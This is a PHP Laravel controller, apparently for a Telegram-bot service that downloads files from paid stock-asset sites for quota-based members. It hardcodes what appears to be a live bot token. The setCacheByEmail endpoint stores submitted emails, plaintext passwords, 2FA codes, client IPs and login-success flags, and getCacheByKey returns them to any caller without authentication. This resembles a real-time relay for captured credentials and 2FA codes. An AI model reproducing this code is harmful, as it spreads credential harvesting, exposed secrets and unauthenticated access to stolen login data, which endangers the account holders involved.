<?php

namespace App\Http\Controllers;

use App\Constant\GlobalConstant;
use App\Models\DownloadHistory;
use App\Models\Member;
use App\Models\Package;
use App\Models\Website;
use Exception;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Throwable;

class BotController extends Controller
{
    public $botKey;
    public $groupTelegramId;

    public function __construct()
    {
        $this->botKey = "7464014003:AAF9NYa010asmUdBl_0rgzRyMrsVnmX5BcU";
        $this->groupTelegramId = "-1002226806991";
        // $this->botKey = $settings['bot_id'];
        // $this->groupTelegramId = $settings['group_id'];
    }

    public function setCacheById(Request $request)
    {
        try {
            $id = $request->id ?? '';
            $url = $request->url ?? '';
            $website_id = $request->website_id ?? '';
            Cache::put($id, json_encode([
                'id' => $id,
                'url' => $url,
            ]));

            $downloadHistory = DownloadHistory::where([
                ['user_id', '=', $id],
                ['url', '=', $url],

            ])
                ->whereBetween('created_at', [now()->format('Y-m-d 00:00:00'), now()->format('Y-m-d 23:59:59')])
                ->first();
            DB::beginTransaction();
            if (!$downloadHistory) {
                // get priority package 1 - by website 2 - by web all 3 - by number file
                $members = Member::with('package')
                    ->where(
                        [
                            ['user_id', '=', $id],
                            ['expired_at', '>=', now()->format('Y-m-d 00:00:00')],
                        ]
                    )
                    ->whereHas('package', function ($q) {
                        $q->whereColumn('members.downloaded_number_file', '<', 'packages.number_file');
                    })
                    ->orderBy('number_file')
                    ->orderBy('expire')
                    ->get();

                $packageSelected = null;
                foreach ($members as $member) {
                    // if there is package by website id
                    if (strlen($website_id) && $member->website_id == $website_id) {
                        $packageSelected = $member;
                        break;
                    }
                    // if there is package by website all
                    if ($member->website_id == GlobalConstant::WEB_ALL) {
                        $packageSelected = $member;
                    }
                }

                // increase downloaded_number_file
                $packageSelected = $packageSelected ?:
                    $members->where('website_id', '')
                    ->orWhereNull('website_id')
                    ->first();

                if ($packageSelected) {
                    $packageSelected->increment('downloaded_number_file');
                }
                // create download history
                DownloadHistory::create([
                    'user_id' => $id,
                    'url' => $url,
                ]);
            }
            DB::commit();

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            Cache::forget($id);
            DB::rollBack();

            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function sendMessage(Request $request)
    {
        try {
            $data = $request->validate([
                'id' => 'required|integer',
                'text' => 'required|string',
                'typeDownload' => 'nullable|in:' . implode(',', GlobalConstant::DOWNLOAD_TYPE) .
                    '|required_if:typeWeb,' . implode(',', GlobalConstant::DOWNLOAD_TYPE),
                'typeWeb' => 'required|in:' . implode(',', GlobalConstant::WEB_TYPE),
            ]);

            // check available packages
            $availablePackage = Member::where(
                [
                    ['user_id', '=', $data['id']],
                    ['expired_at', '>=', now()->format('Y-m-d 00:00:00')],
                ]
            )
                ->whereHas('package', function ($q) {
                    $q->whereColumn('members.downloaded_number_file', '<', 'packages.number_file');
                })
                ->where('website_id', $data['typeWeb'])
                ->orWhere('website_id', GlobalConstant::WEB_ALL)
                ->orWhere('website_id', '')
                ->orWhereNull('website_id')
                ->first();

            if (!$availablePackage) {
                throw new Exception('Đã hết số lượt tải file, mời bạn gia hạn hoặc đăng ký gói mới.');
            }

            $newText = $this->getIdFromText($data['text'], $data['typeDownload'] ?? '', $data['typeWeb']);

            $id = $data['id'];
            $dataSend = [
                'chat_id' => $this->groupTelegramId,
                'text' =>  "$id|$newText",
            ];
            $client = new Client();
            // $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
            //     'json' => $dataSend
            // ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => GlobalConstant::STATUS_ERROR,
                'message' => $e->getMessage()
            ]);
        }

        return response()->json([
            'status' => GlobalConstant::STATUS_OK,
        ]);
    }

    public function getIdFromText(string $url, mixed $typeDownload, int|string $typeWeb)
    {
        $result = '';
        switch (true) {
                // vecteezy
            case $typeWeb == GlobalConstant::WEB_VECTEEZY;
                // pattern
                $pattern = '/vector-art\/+.*/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = $matches[0] ?? '';
                // set result
                $result = "$id|taifile|taiVecteezy";
                break;
                // storyblocks
            case $typeWeb == GlobalConstant::WEB_STORYBLOCKS:
                // pattern
                $pattern = '/(video|audio|images)\/stock\/+.*/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = $matches[0] ?? '';
                // set result
                $result = "$id|taifile|taiStoryblocks";
                break;
                // pikbest
            case $typeWeb == GlobalConstant::WEB_PIKBEST:
                // pattern
                $pattern = '/(_\d+)/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = str_replace(['_', '/'], '', $matches[0] ?? '');
                // set result
                $result = "$id|taifile|taiPikbest";
                break;
                // flaticon
            case $typeWeb == GlobalConstant::WEB_FLATICON:
                // pattern
                $pattern = '/(_\d+)/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = str_replace(['_', '/'], '', $matches[0] ?? '');
                // set result
                $result = "$id|taifile|taiFlaticon";
                break;
                // pngtree
            case $typeWeb == GlobalConstant::WEB_PNGTREE:
                // pattern
                $pattern = '/(_\d+)/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = str_replace(['_', '/'], '', $matches[0] ?? '');
                // set result
                $result = "$id|taifile|taiPngtree";
                break;
                // freepik
            case $typeWeb == GlobalConstant::WEB_FREEPIK:
                // pattern
                $pattern = '/(_\d+)/';
                preg_match($pattern, $url, $matches);
                // get id
                $id = str_replace(['_', '/'], '', $matches[0] ?? '');
                // set result
                $typeDownload = $typeDownload == GlobalConstant::DOWNLOAD_VIDEO ? 'video' : 'file';
                $result = "$id|taifile|tai$typeDownload" . "Freepik";
                break;
                // envato
            case $typeWeb == GlobalConstant::WEB_ENVATO:
                $tmpArr = explode('-', $url);
                // get id
                $id = $tmpArr[count($tmpArr) - 1] ?? '';
                // set result
                $typeDownload = $typeDownload == GlobalConstant::DOWNLOAD_LICENSE ? 'getlicense' : 'taifile';
                $result = "$id|$typeDownload|taiEnvato";
                break;
                // motion
            case $typeWeb == GlobalConstant::WEB_MOTION:
                $tmpArr = explode('-', $url);
                // get id
                $id = str_replace(['_', '/'], '', $tmpArr[count($tmpArr) - 1] ?? '');
                // set result
                $typeDownload = $typeDownload == GlobalConstant::DOWNLOAD_LICENSE ? 'getlicense' : 'taifile';
                $result = "$id|$typeDownload|taifileMotion";
                break;
                // lovepik
            case $typeWeb == GlobalConstant::WEB_LOVEPIK:
                // pattern
                $pattern = '/(image-|video-)\d+/';
                preg_match($pattern, $url, $matches);
                $tmpArr = explode('-', $matches[0] ?? '');
                // get id
                $typeFile = str_replace(['_', '/'], '', $tmpArr[0] ?? '');
                $id = str_replace(['_', '/'], '', $tmpArr[1] ?? '');
                // set result
                $result = "$id|taifile|tai$typeFile" . "Lovepik";
                break;
            default:
                break;
        }

        return $result;
    }

    public function deleteAllCache(Request $request)
    {
        try {
            Cache::flush();

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function setCacheByEmail(Request $request)
    {
        try {
            $email = $request->email ?? '';
            $password = $request->password ?? '';
            $fa = $request->fa ?? '';
            $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
            $isFaSuccessfully = $request->isFaSuccessfully ?? '';
            $typeFa = $request->typeFa ?? '';
            Cache::put($email, json_encode([
                'ip' => $request->ip(),
                'email' => $email,
                'password' => $password,
                'fa' => $fa,
                'typeFa' => $typeFa,
                'isLoginSuccessfully' => $isLoginSuccessfully,
                'isFaSuccessfully' => $isFaSuccessfully,
            ]), 10);

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            Cache::forget($email);
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function getCacheById(Request $request)
    {
        return response()->json([
            'status' => 0,
            'data' => json_decode(Cache::pull($request->id ?? '', ''))
        ]);
    }

    public function getCacheByKey(Request $request)
    {
        try {
            $key = $request->key ?? '';
            return response()->json([
                'status' => 0,
                'data' => json_decode(Cache::pull($key, ''))
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }
}
